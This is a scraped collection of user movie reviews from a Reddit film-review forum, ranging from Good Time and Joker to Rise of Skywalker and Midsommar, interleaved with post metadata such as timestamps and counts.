                The movie follows Connie Nikas who is on the run from the law after a bank robbery goes wrong. Now he must avoid getting caught as he tries his hardest to get his brother out of custody. His brother gets caught after they robbed the bank. Now it is a race against time.  What makes this movie amazing is how it creates tension through small details that constantly present themselves as he tries to stay hidden. It is clear early on that this isn’t going to be easy for Connie, and it shouldn’t be. While on the run, Connie will pass multiple cops who are currently hunting him down. You learn that Connie is kind of a piece of shit, and you learn through his failed attempts to find asylum that he has no where to go. What do you do when you have no where to hide? You run! And there is a lot of running in this movie. This is a high octane; high tension movie and you will have no choice but to echo the small sighs of relief and respite that Connie finds through out his journey. And these moments are few and become more far in between as he digs himself deeper and deeper into trouble.

                As a character, Connie is brilliant. He only cares about two things, himself and his brother and it is echoed throughout the movie as he does whatever it takes to get his brother back. He does so even if it means hurting and using both the people he knows and strangers. Connie is smart, despite his continually making bad decisions. When faced with a problem, he is quick to make decisions. The lies he forms, the quick change in appearance, how easily he seems to move from one problem to the next suggest that he is a veteran at his craft. But he is not the traditional cool headed, or even hot-headed action hero thief as seen in similar films. As he gets more and more cornered, you see him start to break. You can see the toll the chase is taking on him. He is tired, he is thirsty, he is desperate and that makes him human. Being human is important because it adds to the tension in the film. You feel that at any moment, his journey will end with one mistake. And as his journey progresses, you can see that he is learning from it. The key is that through all this chaos, he does experience personal growth and he ends up at the end of the movie changed by the outcome, even if it isn’t the traditional bad ass that we have become accustomed to. Robert Pattinson’s performance alone should be reason to watch the film.

                If you haven’t seen this movie, I would definitely recommend it. If you saw Uncut Gems and liked it, then you should watch the far better older brother. It’s a great movie for those who love thrillers but are tired of the same tired formula.",moviereviews,3050,574,58,0
1588084785.0,The Craft (1996) [SPOILERS],"[Letterboxd Review: The Craft (1996)](

This movie is a very fun, teen movie. Robin Tunney (Sarah) and Fairuza Balk (Nancy) really steal the show with their performances. The film did feel bipolar at times because Neve Campbell and Rachel True's characters, Bonnie & Rochelle, were at certain moments, people you're supposed to empathize with, then the next minute they are assholes (to Sarah). This back-and-forth relationship kind of continues throughout the movie. I suppose this movie shows that power corrupts.

One thing that felt missing from this movie was Bonnie's story. We saw that they each wished for something in the beach scene; Sarah wished for (Chris's) love, Nancy wished for power, Bonnies wished for beauty, and Rochelle wished for revenge on Laura Lizzie. We see each of them go through the consequences of what they have asked for, with the exception of Bonnie. My wish is that we got to see that play out more. While both Bonnie and Rochelle were Nancy's lackeys, we at least got to see Rochelle in shock when she saw Laura's hair falling out...although she, later on, doesn't seem to feel any remorse for it. Again, power corrupts.

In typical FOTR endings of reviews, while I do not think this movie needs a sequel, it would absolutely be a fun one to reboot. Bring back the original cast to play as mothers/school teachers for fun. I would love to see a modern-day twist on this.

Nevertheless, this is still a movie worth checking out! It is also a bonus seeing Neve Campbell and Skeet Ulrich in the same movie.

The only way I can see some people enjoying this movie is nostalgia, wich is completely fine because I have some experiences like that with other shit movies.
The plot goes of trail alot and they clearly spent most of their money on Gilbert Gottfied cause at any moment they try and squeeze his voice in ever scene just to try and get their money worth.

1586494832.0,I am the pretty thing that lives in this house (2016),"This movie is the worst movie I have ever seen in my life. It's actually so bad that I specifically went to find a movie review subreddit so that I can post about how bad this movie is.  
  
It's not a ""it's so bad, it's good"" movie it's just bad.  
    
All of the actors, dialogue, and characters portrayed in the movie do every action at snail's pace.  
They talk at speeds so slow that it is infuriating to listen to.  When they walk downstairs in a scene they walk downstairs for over a minute straight. The fastest dialogue that came out of the movie was close to the end when an 80 year old has half a paragraph of speech and she speaks at a normal rate. 

This movie also has almost no substance.  It's about a hospice nurse who lives in Old presumably haunted house with an old lady who wrote some books and one of the books is acting out like the story of the movie.  The main character however is too afraid to read the book.  The scariest scene in the whole movie is when the main character is talking on the phone and you slowly over a course of 2 or 3 minutes see the phone's cable lifting up into the air only to be yanked out of the main characters hand.  

It is marketed as a horror movie except there is nothing scary in it.  I kept holding out until the end fighting my boredom to wait until I could see something that would save this movie a last-minute twist or an action scene that would make it all worthwhile.  Nothing the main character spontaneously dies presumably of boredom from acting in this atrocious piece of garbage.  
  
Somehow this movie has 50% reviews. I can only assume the reviewers fell asleep part way through and had to fill in the blanks with their mind.

Well, the plot is simple, you have seen it a hundred times with movies such as Aliens and even the Meg in terms of the underwater sea creature element which was honestly a fairly enjoyable but all in all a pretty bland movie. But yes, the movie wastes no time with character building and cuts to the chase thus, I would say that this movie is entirely carried by the atmosphere created and also the acting. It is definitely not a story driven movie nor is it one with much character building moments. 


Previously as I believe many of us have, the only movie I have seen Kristen Stewart act in was in the Twilight series; yes, THAT series and yes, I have heard from others that she was actually a good actor with her taking part in various indie films which aren't shown in Malaysia. So, I must really praise her acting here, it is nothing iconic whatsoever but her ability to communicate the sense of fear and dread that she is feeling whilst crossing the ocean's floor is truly mesmerizing in a weird sense, and this is also due to the director, William Eubank as I believe, the acting was above par for a movie such as this., so all credits to him for getting the best out of the actors with what they were given to work with. 


Given the estimated budget of this movie ranging from 50-80 million USD budget, and where this movie is intended to take place, a thousand leagues under the sea, they did an incredible job with the budget given. The CGI is fairly serviceable and believable, and this is  mainly due to the fact that the entire movie takes place at such low lighting depths where the SFX team were able to hide the CGI in the darkness. There are indeed certain scenes where you could notice the obvious CGI which is the walk on the sea bed where there is the whole floating heads issue whilst they are in their suit. Kind of the issue certain individuals had when the Iron Man suits became more dependent on CGI rather than actual costumes.


There's nothing much to talk about for this movie, it is a fun one where certain scenes will leave you at the edge of your seat. with a runtime of 1 hour and 35 minutes, this is a pretty good movie and I would recommend this movie for those whom want to fill that 'I want to watch a good January movie' void that they have going on. ",moviereviews,2699,498,46,0
1579327719.0,Zoom(2006) review,"Spoiler warnings: 3/10. I hated this movie. It’s supposed to be a comedy but I didn’t laugh at all. If the main character want such a pushover and the kids weren’t annoying and they weren’t kids it would’ve been a lot better. I also would’ve preferred if it was a bit more serious. Zoom, the main character, should’ve hated the government but he still went along with their plans. No retaliation at all. The government mutated Zoom and his team which corrupted his brother. So not only did his brother kill his whole team Zoom had to kill his brother. All thanks to the government . I just would’ve preferred if this movie was a serious superhero movie. Sure, superhero’s movies are too serious nowadays but back then it definitely would’ve been a different movie if it was more serious. Then there’s the children. Goddamn they’re annoying. The only one I didn’t mind was the fat one but that only because he wasn’t involved in the story that much. All of the children were forced to go to that facility by their parents and the government officials but it’s somehow Zooms fault because he didn’t train them for something that’ll put THEM in mortal danger. Sure you can argue they didn’t know there was a crazy deranged supervillain after them but you can’t say they didn’t have some clue to why they were training there powers. Also apparently Zoom didn’t kill his brother but sent him to some dimension and “lost” his powers in the process. So his brother finally escaped the other dimension and is coming back for revenge I guess. Not only does the government kidnap a former victim of their experiments, they train children for death/murder, by using the children to kill his own brother. Sure, the government was trying to cure the brother (aka concussion) from the experiments they did on him, but not only were they on a time crunch if the experiment failed the children would’ve either killed or be killed by concussion. There’s also the bullshit ending. According to Concussion he was stuck in eternal darkness for around 10-20 years. He was awake for all of that. It’s not like he was in a sleep like state he was fully conscious. That many years would’ve made anyone crazy so there’s no way he just goes back to normal when the mutation is out of his system. But that’s not as much bullshit as the kids actually defeating Concussion with relative ease. His powers were like a force explosion but he couldn’t kill a 17 year old girl with telekinesis, a 17 year old boy that can turn somewhat invisible, a kid who can just make part of his body fatter, and a 7 year old kid with super strength. Sure most of these powers are pretty powerful but they didn’t take the mutation that gave them the fullest extent of their powers, they don’t have actual experience, and someone who is out for blood is a shit more powerful than kids that don’t have fighting experience at all. I wouldn’t even minded if they won but they won so damn easily. That’s what I think of this shitty movie. If you read all this then at least tell me your opinion on this crap movie.",moviereviews,3062,552,45,0

My rating: 

9/10

This movie certainly lives up to the hype and expectation given by the fact that they won the award for best drama at the Golden Globes last year. However, to say that this movie is better than Joker is well, I don't buy that as Joker has a better narrative and cinematography, but that is just my opinion. Firstly, I would like to make things clear that this is a movie about the humane side of war and the emotional toll it has on those involved within these wars and at its core, the human spirit to survive. 

The actor that absolutely stood out to me within this film is definitely George Mackay whom I have never heard of or have ever seen him in many major films before this and it is quite shocking to say that as he is indeed a talented actor whom in my opinion, if not for his acting capabilities, this entire movie would fall apart as this movie is more of a character driven movie rather than one that relies heavily on the movie's narrative. He manages to convey his character's emotions through his body language and all credit to director Sam Mendes too whom chose to direct a movie that requires the audience to observe and pay attention to the character's rather than having the character announce his emotions as seen in various movies these days. For me personally, the stand out scene would be the scene involving George Mackay's character in an army truck and it is truly such a powerful and emotional scene. 

Speaking of characters, I felt the use of cameos from major stars such as Andrew Scott, Benedict Cumberbatch, Colin Firth and etc unnecessary as scenes with them last for approximately a minute or two and these scenes sort of stand out like a sore thumb in the movie as you know that it's just a cameo and these major stars are there for the sake of being there to provide the movie some extra dressing. Some may love this but I felt that these scenes were unnecessary and these actors could've been put to better use. 

As for the most talked about point regarding this movie, this movie is edited in such a way that makes it seem like a one-shot. The entire experience was amazing and it draws you into the brutal minute-by-minute environment of war; from the casual conversations between soldiers to the nasty action sequences. I was wondering if all the events would take place within the movie's 2 hour runtime but they managed to pull off the passage of time absolutely brilliantly without having to break the one-shot effect they were really gunning for. 

The cinematography was absolutely brilliant too, my gosh, this is a beautiful movie. I kid you not, each frame of this movie can be a screensaver and it is indeed an awe dropping experience. From the colour gradient used which is generally a sort of dull colour to depict the gritty environment of the battlefield to a beautiful flame within what is a dull environment (Not too experienced when it comes to colour gradients so this is the best I can do to explain it, sorry). 

As previously mentioned, I now shall comment upon the movie's narrative. Well, it isn't anything new to be honest which is where I feel the movie severely lacks as the end goal is certain and you can kind of guess how the movie is going to turn out regardless of the movie's emphasis on the race against time to deliver the message. Furthermore, I did not feel much tension during the movie as I hoped I would and this is mainly due to yet again, the predictability of the movie's endgame. 

Generally, at the end of the day, this is w a must watch. It may not be my pick for the Golden Globe award but my gosh, this is truly a cinematic experience you should not miss out on. Besides, it's January, all the movies out now can be missed out on and you probably wouldn't regret missing it; but this, this you cannot miss. ",moviereviews,3817,695,63,0

1577848305.0,So I just got done watching Once Upon a Time in Hollywood (my review),"*May contain some spoilers:*

I was told by various sources and people, that Once Upon a Time in Hollywood, is by far, Tarantino's worst film ever. I feel so silly for believing the critics now. I thought this movie was fantastic. I really enjoyed it. As of 2019, I'd say that Once Upon a Time in Hollywood and Joker, have been two great movie releases for this year.

Now, here's why I think some people didn't enjoy the film:

The story-line definitely revolves around a 1960's nostalgia. So unless you're nostalgic, knowledgeable, or interested in the 1960's, than this film may not appeal to you. I wasn't even around to experience the 60's (being born in 94), but I always found that period of time quite fascinating. So I loved the whole 60's nostalgia within the film. And it also revolved around 1960's Hollywood cinema. Which yet again, if that doesn't interest you, than you may not enjoy the film. I think it may be for a particular audience. Me being one of them.

Secondly, I think the film was overly-blown about the whole Charles Manson aspect. Just to be clear, this film is not necessarily about Charles Manson and the Manson family. It is only a fragment of the story. So I think a lot of people entered this film, under the assumption that it would be entirely revolving around the Manson family. But I'm personally glad this wasn't an all out Manson film. That story has been done so many times.

And another reason people bashed this film was for Tarantino's choice to manipulate history. For example; a lot of people hated the fact that the film made Bruce Lee look like a narcissistic asshole. Some people hated the fact that the demise of the Manson family occurred under fictional circumstances. But none of those things bothered me. Keep in mind, Tarantino did the same thing in The Inglorious Bastards, depicting a fictional set of circumstances for Hitler's demise. This film was similar in that sense. I also loved The Inglorious Bastards by the way.

The cast was fantastic. It was well directed. And unlike some of Tarantino's films, the dialogue didn't exactly drag on to a relentless point. Like Death Proof for example. And this was actually one of Tarantino's first comedies. There were a lot of funny parts. The film didn't take itself too seriously, and yet, still maintained a sense of realism. The soundtrack was great. There were so many upsides to this film.

The ending was CRAZY. Epic.

So overall, I really liked it. Would watch again.",moviereviews,2479,433,83,0
1577516676.0,Star Wars Episode 9 Rise of Skywalker is the worst Star Wars movie ever made.,"When The Last Jedi came out i was hyped beyond belief because i loved The Force Awakens  but then i seen it  i hated it  then i seen it again when it went on netflix still hated it but nothing compares to this pile of shit...it was so bad it was funny  it literally took lines from the past movies that is how unoriginal this movie was the amount of problems i have in this movie is so much that i would have wrote a book  by the time i was done writing this so i will try naming the main problems all in order and  review it as best as i can .

Movie starts with Kylo Ren finding the Emperor and he repeats the same line from Episode 3 and he makes Kylo his Appertintice and he looks like a zombie the fact the Emperor is even in this movie makes me mad because it makes Darth Vader's sacrifice meaningless except the fact he saved his son it just takes away from Episode 6 kinda now,  Rey is overpowered as fuck and leia has barely trained her, Leia should have had a bigger part (i know it was probably because Carrie Fisher died),  They spend most of this movie looking for basically a sith holocron and it just boring, Kylo Ren gets his mask back which i like his mask but  it kinda ruins his character development from the last movie because he no longer wanted to  be in Darth Vader's shadow the mask represents that so it is kinda a step back,Chewbacca is kidnapped and rey holds the TIE fighter with the force then Kylo comes out and tries to stop Rey from stopping the TIE fighter Rey gets angry at this  so much so force lighting comes out of her hand and SHE FUCKING KILLS CHEWBACCA....i almost walked out , Rey,Finn, and Poe get trapped in quicksand and as they all think they are going to die Finn says"" Rey before i die i want you to know something""  and then he gets swallowed and so does Rey and Poe but they are fine and then Rey confronts him about it and he says it is nothing  i thought originally he is going to say i love you but J.J Abrams came out and said he was going to tell Rey he was force sensitive....why the fuck is that such a big secret and why is he hiding it like it is a bad thing and when the fuck did Finn become force sensitive,JK CHEWBACCA IS ALIVE ,

force healing is a thing now after Rey heals a monster worm that tries to kill everyone and we have no idea how rey knows how to do this, Rey and Kylo's lightsaber fight is boring ,Leia dies by using the force to distracting Kylo during a lightsaber fight  against rey  by saying   ""Ben"" then just falls over and dying......yes i am serious,Rey wins the battle and stabs kylo and heals him she then steals his ship like a absolute boss  and then kylo sees han solo  and he  repeats  THE SAME THING HE SAID TO KYLO IN THE FORCE AWAKEN AND IT LITERALLY IS THE SAME SCENE  and also it doesn't make sense that han is a ghost he wasn't a jedi i really think they should have used luke for this scene instead , Kylo turns good  yayyyyyyyy....,Rey almost gives up but Luke Skywalker's force ghost stops her best scene in the movie in my opinion ,Rey finds the Emperor and he reveals that Rey is his Granddaughter which i kinda wish it was revealed that she was actually Luke's daughter and that he wiped her memory and sent her to whatever planet that was in Force Awakens to protect her from Kylo,Snoke,and the First Order that is just me,

Kylo comes and we finally see the Knights of Ren and they were disappointing,kylo defeats them shocker,then there is a space fight above the planet the Emperor is on and it is just a bigger version of the Return of the Jedi space battle  this movie really is basically a worst version of Return of the Jedi and the Emperor i shit you not lights up everyone with force lighting besides the important people ....,Rey and Ben fight Palpatine and Palpatine does this weird thing where he takes Ben and Rey's life force to regenerate himself and his eyes turn a really weird cg orange yellowish color and then  he  yeets  Kylo the fuck out of there throwing him off a cliff and we think he is dead and then the Emperor gets the spirit of all the sith in him somehow and he is like i am the sith and then Rey gets all the spirit of the jedi in her and she is like ""and i...am all the jedi"" and she snaps the infinity  gauntlet oh..wrong movie  but serious that happens that is how lazy the writing is they switched up the end game words and said boom no one will notice that  and she defeats the Emperor killing him and for some reason she dies....what the fuck,SURPRISEEEE BEN IS ALIVE there are a lot of fake deaths in this movie and it pisses you off  and Ben force heals her and she comes back to life and then they kiss and he dies......WTF how is he died wtf happened and then Ben and Leia turn into force ghosts..

okay  Now i'm about to point something out that i will probably make another post about because this is pretty long and i know some people will be too lazy to read this but i think what a lot of people don't understand and what Disney didn't even pay attention to and just wanted to please the teens wet dreams of Kylo and Rey being together when they wanted to ship Kylo and Rey is... Anakin's father is the Emperor  it is canon they made a canon comic and revealed that and in the script in episode 3 there is a deleted scene where palpatine reveals to anakin that he is his father and the he made him through the force .....Kylo is the grandson of Darth Vader ...Rey is the granddaughter of  the Emperor so  when the Emperor tells Rey she is her granddaughter he is basically telling her she is related in some way to the Skywalker's....Rey and Kylo/Ben kiss romantically at the end of this movie....Rey and Ben commited incest KNOWINGLY....not once in Star Wars history but twice they decided to make  relatives kiss  each other Luke and Leia get a pass because George Lucas didn't know he was going to do that and in the movie Luke and Leia didn't know  they were related yet but Rey and Kylo ....this is the last movie of the trilogy they knew where they were heading when they sit this thing up like wtf. and they kiss KNOWINGLY after the Emperor said it both to Ben and Rey but then again i guess they probably didn't know Darth Vader was his son

any way finally,Rey goes to Tatooine after the resistance defeat the first order or final order whatever you want to call them and she is asked who she is and Luke and Leia watch before she says her name and she says Rey Skywalker and that is the end of  Star Wars......this movie is a shit show and we all know this isn't the last Star Wars movie disney is going to go back to the drawing board see what went wrong and they will either reboot or make another Star Wars movie of something new not caring if it is good or bad because no matter what people will go see there movies and at the end of the day they are still making ridiculous amount of money and posts and videos like this at the end of the day really don't matter i just wrote this because i was bored.....Star Wars Rise of Skywalker is not worth seeing in theaters  don't waste your money.

p.s. i know i did not make this grammarly proper and it is because i was just bored when i wrote this i don't really have a life so be kind  lol",moviereviews,7201,1386,136,0
1576720089.0,"Rise of Skywalker is the last chance to revive Disney's Star Wars, but do fans still care enough? Does anyone? - by Jacob Smith - 8 Dec 2019","'The Rise of Skywalker' is out this month but the hype around Disney's $4 billion 'Star Wars' franchise just isn't there, and it hasn't been for a while. Why have fan interest and box office figures been completely subverted? .

If you have lived in the media bubble for the past three years, you may believe the only objection to the franchise's direction comes from a shady group of politically motivated nerds. If you are outside of the bubble, you are well aware that Disney's post-George Lucas universe has struggled to connect with its audience, to say the least. Or – worse than that for Disney – you've simply stopped going to the films, buying the toys, and riding the themed attractions. .

Not just 'The Last Jedi'

By now, we all know the backlash surrounding 'The Last Jedi,' the second part of the new trilogy, but the problem goes deeper than one divisive film. Sure, 'The Last Jedi' made $700 million less than its predecessor 'The Force Awakens' did in 2015, but that won't tell you the story. .

Turmoil has been the mainstay of Lucasfilm head Kathleen Kennedy's era at the helm of the iconic series. Virtually every project she has worked on has led to behind-the-scenes drama. 2016’s 'Rogue One: A Star Wars Story' saw nearly the entire film rewritten and millions were spent on reshoots before the final product was released to a lukewarm response from audiences. .

Shortly after this, another 'Star Wars' film was met with behind-the-scenes drama as Phil Miller and Chris Lord were fired as the directors of 'Solo: A Star Wars Story' due to creative clashes with Kathleen Kennedy. This led to another round of ground-up reshoots, as well as talk that Alden Ehrenreich was so miscast as Han Solo, they needed to hire an acting coach during filming for the movie. Ouch. .

Then Rian Johnson penned and directed 'The Last Jedi,' a film that split the fan base, perhaps irrevocably. As the fallout merged with the dysfunction of the Han Solo movie, fans did not want to see another 'Star Wars' movie going forward, leading to 'Solo' bombing at the box office just six months later. As Disney lost the narrative of their billion-dollar franchise, the tabloid drama began to take the air out of any breathless release from the studio. .

It's your own fault you don't like our films

Taking its cue from another esteemed US establishment, Disney decided to divert the blame – with its most loyal customers chosen as the patsy. .

The compliant establishment media began to point the finger at what they described as ""Star Wars' toxic fanbase."" Fans were shamed as actress Kelly Marie Tran deleted her Instagram account due to harassment, despite the fact that Tran herself never stated that as a reason. The narrative was repeated beat-for-beat with lead actress Daisy Ridley, though she never confirmed it either. .

A bad feeling about this… .

As the media focused its Death Star ray on the fans, the 'Star Wars' slate, planned for a more than a decade ahead, began to collapse in on itself. . .

'Star Wars' spinoff movies such as 'Boba Fett' and 'Obi-Wan Kenobi' were scrapped or restructured as Disney Plus content.

Rian Johnson, who was scheduled to have his own 'Star Wars' trilogy, had his plans shelved indefinitely. 'Game of Thrones' creators David Benioff and D.B. Weiss walked away from plans to create their own trilogy of 'Star Wars' movies.

Just as the hope of the Resistance rests on a few scattered survivors, Disney's near-term 'Star Wars' future can only be saved by 'The Rise of Skywalker.'

New 'Star Wars' may have a gay character — if this franchise continues to go woke, it will continue to go broke

Yet, the last chapter of the Disney era trilogy has been beset by the same behind-the-scenes turmoil as the others. From stories of the film's poor test screenings to director J.J. Abrams' struggle to creatively right the ship away from his predecessor Rian Johnson. A struggle so bad that there are rumors the film still isn't finished, weeks before its release.

Pre-order sales are disappointing and early projections have placed expected gross between 'Solo' and 'Rogue One,' once considered the humble sideshows.

Is 'Star Wars' OK?

It is hard to imagine a world where we may never get another major 'Star Wars' film in theaters again, but after continued box office disappointments, Disney may look into leaving the big screen altogether.

There are no plans for 'Star Wars' films after 2019, as Bob Iger has confirmed. Disney is on a push to reach 60 million subscribers to Disney Plus, meaning that everything that was planned for the big screen has now shifted to their streaming service, as seen with 'The Mandalorian,' its better-received spinoff series set centuries before the current trilogy.

Lucasfilm head Kathleen Kennedy is signed to stay until 2021. However, after many projects having fallen apart, it would be difficult to see her remaining following an underwhelming Episode 9 performance. If failure is an option, that means Disney will be forced back to square one after burning out the goodwill of a property in just four angry years.

The outlook is not strong for the company, but what about the fans? The cultural relevance of 'Star Wars' is too big to ever truly die but it is mortally wounded. Ticket sales are down, merchandise sales are down, Star Wars: Galaxy's Edge theme park was a deserted bore when it opened earlier this year. Disney's purportedly failsafe plan was to hook a new generation of fans for the next 40 years just like George Lucas did in the 1970s, but that is not happening.

The studio can create the largest superhero soap opera the world has ever seen, the happiest place on Earth, or one of three separate online streaming services, but the one miracle they can't conjure is audience love for future 'Star Wars' films. That magical feeling that the films once evoked with two notes of the opening theme.

Diehard fans will return – out of obligation, forlorn hope, or gleeful hate – to see how the story of Rey and Kylo comes to end, but they may view this final film as their curtain call to a once vibrant fandom.

By the time a new, good 'Star Wars' film comes out years from now, the last good one might have been from half a century earlier. And once the Force is gone, who knows if Disney – or anyone else – can ever get it back?

1574344012.0,Avengers EndGame Movie Review,"Marvel fans won't be surprised what happens in the first fifteen minutes of Endgame as they've already seen glimpses of the scenes in the teaser trailers. With Thanos already destroyed half of the avengers and the population of the world but his uprise continues. The first half of the movie is all about lost and grief as the avengers try to come to terms with the loss of their fellow mates as well as the five stages of grief. Some will learn to cope with their defeat whilst some will fall off the edge into complete destruction. As Steve Rogers (Chris Evans) quoted in the teaser trailers ""Some people move on, but not us"" The Avengers are struggling to come to terms with what is left, whilst the families that are left untouched are trying to get use to the changes that have happened to the world. Steve Rogers and Tony Stark (Robert Downey Jr) are reunited in failure however there is still bad blood between them. Steve is still attempting to hold everyone's morales, but as the viewers can see it is running thin in his own desperation. Thor (Chris Hemsworth) spirals out of control and blames himself that. the Avengers lost the war against Thanos and goes off the deep end, struggling with alcoholisms and drastic weight gain, he is not the same Thor we all knew at the beginning of the Avengers. Rocket (Bradley Cooper) and professor Hulk locate Thor and tries to help him but he refuses help from anyone as well as not contacting the remaining team. Hawkeye (Jeremy Runner) is taking is anger and vengeance on the whole universe as he turns into an assassin\*/\* mercenary and kills whoever has a bounty on their head. The movie is full of real life issues such as Alcoholism, depression, anxiety, drastic life changes and avoidance of things that are to agonising to even face. So expect non-literal gut punches in the first half of the film before they all come together and figure a plan to defeat Thanos once and for all. The movies is astonishingly funny even in its deepest darkest moments. Thor delivers a piece of what we call “physical comedy' that overthrows our expectations and brings the biggest gag of the whole Avengers franchise. The movies isn't about getting the whole team back together and be all happy go lucky about it but its about coming together and developing a plan as well as sharing knowledge in order to get revenge once and for all. It is a long movie but it has to be in order to see the issues that underlie each character whilst they are coping with their independent issues and the issues that they share together. There are a few shocking death scenes that are a shock to the Marvel universe, however the fans are eager to know what happens next in the franchise. What happens next depends on how the Avengers come to terms with the shocking twists.",moviereviews,2800,500,35,0

10/10/19

There should be a stream of words, capable of describing this; of which, I'm without. Something like 'cosmic-horror compressed unto a desert island'; yet even that, falls immensely short.

The tension is unyielding; relentless: (like a braided metal wire, woven through the hearts of one hundred souls).

On multiple occasions, the camera  as if by will, moves the way one would hope it would: as if the viewer is the guider; a cooperative unfolding.

And the score, is undeniably majestic! Often eluding a sense joy, or tranquility in contrast to the nightmarish images - and its most definetely horrifying when it needs to be; always building and transitioning of layers from the somber sounds into a haunting, and extremely loud, accompaniment. Possibly the best I've heard in years; (was anxiously awaiting 'Clint Mansell's name to appear in the credits - Darren Aronofsky's go-to composer - and was quite surprised when it wasn't); now, I don't know who this 'Bobby Krlic' is, but I look forward to hearing more from him.
 
And, as I can't say what is more unsettling, the first ten minutes, or the last - I can't imagine, even the slightest few, who could suffer its endurance.

Highly recommended for people who have a lot of bullshit on their mind; invite this terrifyingly beautiful spookshow in, and will clear it all up; as you're certain to think of nothing else.

And though I hate when people compare things like, ""this is the 'JAWS' of bathtub-movies""

Midsommar is 'The Matrix' of terror films.

1570722527.0,"REVIEW & GRADE FOR ""JOKER""","Joker is the first film that made me uncomfortable to watch from beginning to end. I have seen countless thriller and horror films that did not achieve what Todd Phillips’ 2019 film about a man’s slow descent into madness did. Despite my uneasiness throughout its duration, the promoted feelings of hopelessness, despair, and madness are both justified and necessary to the story of Joker. 

It is impossible to talk about any film involving the Joker without a prominent discussion point being the actor’s portrayal of the character. As soon as I got out of the theater, my friend immediately asked me if we had just seen the best portrayal of the Joker. Ever since the release of The Dark Knight in 2008, I have said that Heath Ledger gave the best performance as the Joker. In that movie, the Joker was a mysterious figure with no true origin who’s only true desire was to test the spectrum range between society and chaos and the finite balance between the two. That Joker did not need an origin story. Joaquin Phoenix’s portrayal of the titular character in Joker provided an adequate justification for this version of the character to get an origin story. This Joker is unlike any of the previous incarnations of the character. Phoenix’s Joker was a scarier human being then he was a clown. This perception was achieved by showing the fuel to the madness fire contained inside Arthur Fleck. Before ever putting a single stroke of white paint on his face, Joker sold its main character as a lunatic with a dark past molding his outlook on the future. I will never say that this or any incarnation of the Joker is a relatable character. However, I like the route this film took with the Joker. Instead of the criminal mastermind wanting to cause crime and chaos, Phoenix’s Joker is the product of a dark childhood and incapable of producing the appropriate emotion to cope with the flawed life he lives. The Joker in this film does not know how to cope with the ill fated hand that he has been given thus synthesizing his motivation for overthrowing the societal elite that he blames for his problems. He believes that lower class members of his world deserve to overthrow their upper class brethren. The tagline “put on a happy face” not only sells the film but illustrates the situation that this Joker is in. The film does not necessarily glorify its demented titular character but almost represents a warning about the ends of madness while also being a character study of mental health. The graphic violence in the film is not necessarily a celebration but more a warning for what could happen when the darkest human beings do not receive the appropriate aid, whether that aid be protection from attackers or adequate counseling. Once Fleck dons the clown makeup, he seems more complete as a character thus representing the where the ends of madness could take someone. Joaquin Phoenix is absolutely fantastic in this film. From the physical mannerisms, the auditory techniques (especially the laugh), and the facial expressions, Phoenix paints a new more terrify iteration of the Clown Prince of Crime. Seeing the character with few clothes on was particularly shocking due to the physical contortions shown. Phoenix is so captivating, this character could standalone as an iconic psychological villain without ever introducing the notion of the Joker. 

Accompanying Phoenix’s brilliant leading performance, the film is made using methods that exceeded my expectations. Todd Phillips was known more for his mid-2000’s comedies that, while fun, were not examples of exceptional filmmaking. Joker is a breath of fresh air to the career of Todd Phillips and makes me more intrigued for future films by him. The director uses camera shots that illustrate the world the Joker lives in. I really enjoy the film being set in 1981 and the sets, costumes, and props definitely give the story the appropriate aesthetic sense for its setting. The soundtrack for the film is surprisingly excellent. The main piece of the film’s score, which heavily reminded me of the Game of Thrones song “The Rains of Castamere,” appropriately promoted the film’s tone of hopelessness and bleakness. The dark color pallet, which usually fails in most comic book films (here’s looking at you Suicide Squad and Man of Steel) captures the dystopia feel of 1981 Gotham. Something brilliant the film does is its colors slowly get brighter as Arthur Fleck descends further into the bottomless pit that is the metamorphosis of the Joker. Joker feels like a filmmaker wanted to strip away the template of a “comic book movie” and used base material for its main character to craft its own unique tale. This addition to cinematic Joker lore isn’t just a new chapter but is a new book with its own world completely away from the universe its preceding stories reside in. 

Unfortunately, as much as I love this film, it has two significant flaws. Don’t worry, there will be no major spoilers discussed ahead. Firstly, Joker makes the mistake of forcing the Batman mythos into the story. There is a main character in the plot that if the name was changed from someone that isn’t directly linked to Batman, the story would remain completely unchanged; in fact, this portion of the film feels completely forced. Secondly, the film presents the notion that Arthur Fleck is psychotic and suffers from hallucinations. This comes up as a point in the plot but I think is handled incredibly lazy. I am a big fan of the actor/actress involved in this portion of the plot but I was incredibly let down by how the filmmakers handled it. I do not believe either of these severely harm the film’s quality. I think one flaw represents studio encouragement/interference while the other shows that it doesn’t completely trust the audience to understand that key part of the plot. 

Joker is a breath of fresh air to the “comic book” film genre. If the intent of Warner Bros to have this film be the beginning of a standalone series that operates outside of the DC Cinematic Universe and contains darker, more innovative, and edgier entries, I am definitely intrigued. Joker is the first film since The Dark Knight (coincidentally both having the Joker in them) that feels like if all comic book references and characters were removed, it would still be a fantastic film. This dark masterpiece does not rely on its protagonist’s own legend in order to thrive but uses that lore as a canvas to add a new and innovative layer to it.

1570500950.0,Abraham Lincoln vampire hunter,"Ok so the premise of this movie is pretty silly and it had the unfortunate timing to be released the same year as the Academy award nominated movie Lincoln. So you may not have heard of this movie but in all honesty its pretty entertaining. Now historically accurate it is not but its accurate enough for you to entertain the idea that Honest Abe could have been hunting vampires in his younger years ( if only for a second). So the story is your typical revenge story trope but with a historical figure. His mother gets killed by a vampire so he waits for the day to exact his revenge not realizing his target is a vampire. He gets his butt kicked then meets Henry( Dominic Cooper) who is obviously a vampire but they tried to make it a big reveal ( trust me I havent spoiled anything). Henry trains abe in typical montage fasion, then gives him targets for him to kill until eventually leading him back to the vampire who killed his mom. Now that fight scene was very visually entertaining and a thrill too watch. After a while he and henry part ways for a bit. while seperated, lincoln begins to fight for the law instead of undead Justice. Though the middle gets a little stale the movie as a whole was surprisingly entertaining. If know any history about our 16th President you know he was a badass in real life. So them increasing his badassness is pretty awesome. Also Benjamin Walker was a pretty good young/ old Lincoln, no Daniel Day Lewis, but who is? All in all its completely ridiculous, kind of badass and surprisingly entertaining. With haloween coming up I recommend it. Not quite a hidden gem more like a found marble but still worth a watch ( in my opinion).

